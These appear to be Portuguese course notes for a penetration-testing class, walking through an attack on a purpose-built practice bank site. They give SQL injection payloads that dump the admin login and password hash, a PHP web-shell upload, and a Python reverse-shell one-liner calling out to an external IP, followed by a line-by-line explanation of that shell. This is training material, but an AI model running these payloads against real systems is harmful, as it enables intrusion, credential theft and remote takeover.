# Introdução ao Hacking e Pentest

Estas são as anotações das partes práticas do curso [Introdução ao Hacking e Pentest](https://solyd.com.br/ead/course/introducao-ao-hacking-e-pentest/) oferecido pela Solyd. Todos os passos são executados no site desenvolvido exclusivamente para isso: http://www.bancocn.com.

## Exploração

Nesta etapa o mais importante que temos a descobrir é:
- Se usarmos <code>'</code> como id no URL, recebemos um erro de sintaxe do SQL, então podemos tentar explorar vulnerabilidades do SQL;
- Pelo arquivo /robots.txt, descobrimos a existência da página /admin.

## SQL Injection

Vamos descobrir quantas colunas tem usando o comando SQL ORDER BY Keyword, ele é usado para ordenar os resultados em ordem ascendente ou descendente de acordo com os valores de determinada coluna.
Então por exemplo se queremos ordenar o resultado o resultado pelos valores da coluna 1 e comentar o que viria depois do código usando --, então vamos passar <code>1 ORDER BY 1--</code>. Vamos inserir os comandos sempre após <code>www.bancocn.com/cat.php?id=</code>.
<pre> 
1 ORDER BY 1-- :ok
1 ORDER BY 2-- :ok
1 ORDER BY 3-- :ok
1 ORDER BY 4-- : Unknown column '4' in 'order clause'
</pre>

Então agora sabemos que temos 3 colunas. O comando UNION é usado para combinar o resultados de múltiplos SELECTS, então vamos adicionar uma linha ao resultado.  Vai ser adicionado no final do resultado, mas ele lê o primeiro resultado, então vamos usar o sinal negativo para inverter a ordem dos resultados, por exemplo: <code>-1 UNION SELECT 1,2,3</code>. Podemos usar então database() para obtermos o nome do banco de dados onde as informações são exibidas na tela: 

<code>-1 UNION SELECT 1,2,database()</code>.

Com isso sabemos o nome do nosso banco de dados: bancocn. Para sabermos todas tabelas do banco de dados podemos usar: 

<code>-1 UNION SELECT 1,2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema="bancocn"</code>

Basicamente, estamos inserindo uma linha onde as duas primeiras colunas são 1 e 2 respectivamente, e o terceiro que é o que será exibido na tela, então concatenamos o resultado, que é a busca na tabela tables no banco de dados information_schema que pertence ao banco de dados bancocn, de acordo com o valor na coluna table_schema.

Obtemos agora os nomes das tabelas do nosso banco de dados: categories,pictures,stats,users. Então com os nomes das tabelas escolhemos ver melhor a tabela users, usando um código parecido:

<code>-1 UNION SELECT 1,2, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema="bancocn" AND table_name="users"</code>

As colunas são: id,login,password. Então agora olhamos a tabela das colunas e olhamos onde o banco de dados é bancocn e a tabela é users.

Então podemos agora simplesmente exibir, o login senha:
<code>-1 UNION SELECT 1,2, login FROM bancocn.users</code>
<code>-1 UNION SELECT 1,2, password FROM bancocn.users</code>

Obtemos então o usuário (admin) e a senha (7b71be0e85318117d2e514ce2a2e222c).

Testamos uma criptografia padrão (MD5), usando o [MD5 Decrypter](https://www.md5online.org/) desciptografamos a senha: senhafoda e conseguimos acesso ao painel de admin descoberto anteriormente.

## Shell reversa

Olhando a estrutura dos endereços das imagens carregadas, podemos acessar o diretório dos arquivos /admin/uploads. Lá podemos então abrir um arquivo com extensão php que enviemos ao servidor.

Vamos carregar um arquivo PHP que recebe comandos e executa no terminal, por exemplo para rodar um <code>ls </code> poderíamos usar:
<code>?comando=ls</code>

Em complemento ao endereço do nosso arquivo:/admin/uploads/terminal.php5. O que queremos rodar no terminal, é uma shell reversa, uma versão em python pode ser retirada do [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

<code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("179.189.157.42",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' </code>

Substituindo o IP pelo endereço da nossa máquina, para isso podemos consultar o [What is my IP](https://whatismyip.com.br/) por exemplo. Vamos utilizar o [netcat](https://eternallybored.org/misc/netcat/) para windows disponibilizado por Jernej Simoncic.

# Bônus: construindo a Shell Reversa

Soquete é o ponto-final de um fluxo de comunicação entre 2 aplicativos através da rede. Portanto para 2 aplicativos temos 2 pontos finais, chamados normalmente de
- Servidor: considerado a máquina 'principal', ela envia os comandos ;
- Cliente: responsável por se conectar no servidor e receber e executa comandos.

Queremos então criarmos um cliente para rodar em nossa máquina. Para isso precisamos definir algumas coisas:
- A representação do endereço (Família de protocolo): Usamos o AF_INET (domínio da internet) é uma família de endereços onde usamos um par de valores: (servidor, porta), onde:
	- servidor: é um hostname de um domínio de internet (daring.cwi.nl) ou um endereço IP;
	- porta: um inteiro.
- Tipo: especifica a semântica da comunicação e usamos o SOCK_STREAM que fornece uma conexão sequencial, confiável e bidirecional. Ela indica que nosso soquete vai ser do tipo TCP.

Definido o protocolo que vamos utilizar para o envio de informações e como vamos representar o endereço, podemos então fornecer o IP e porta para se conectar ao nosso servidor.

```
soquete=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  #Configura o socket
soquete.connect(("127.0.0.1",6666))                       #Conecta em nosso servidor
```

O próximo passo é lidarmos com os descritores de arquivos, isto é um indicador abstrato para acessar um arquivo. Cada processo Unix tem três descritores de arquivos padrões, representados por inteiros:
- 0: Entrada padrão;
- 1: Saída padrão;
- 2: Erro padrão.

Então o nosso próximo passo, é pegarmos o descritor de arquivo do soquete, fazemos isso com o comando:

<code>soquete.fileno()</code>

E fazermos os descritores de arquivo padrões indicarem para o mesmo lugar, ou seja, o soquete:
```
os.dup2(das,0)						#Duplica o descritor 'das' para 0                                    
os.dup2(das,1)						#Duplica o descritor 'das' para 1
os.dup2(das,2)						#Duplica o descritor 'das' para 2
```

Agora então, as entradas e saídas de nosso processo serão recebidas e enviadas através do nosso soquete, ou seja a comunicação é feita com nosso servidor. Por fim, nos falta executar de fato a shell(<code>/bin/sh</code>) apenas:

<code>subprocess.call(["/bin/sh"])			#Executamos a shell</code>

Ainda podemos usar o argumento <code>-i</code> para forar a shell a rodar de interativo. Nesse caso usaríamos <code>subprocess.call(["/bin/sh","-i"])</code>.
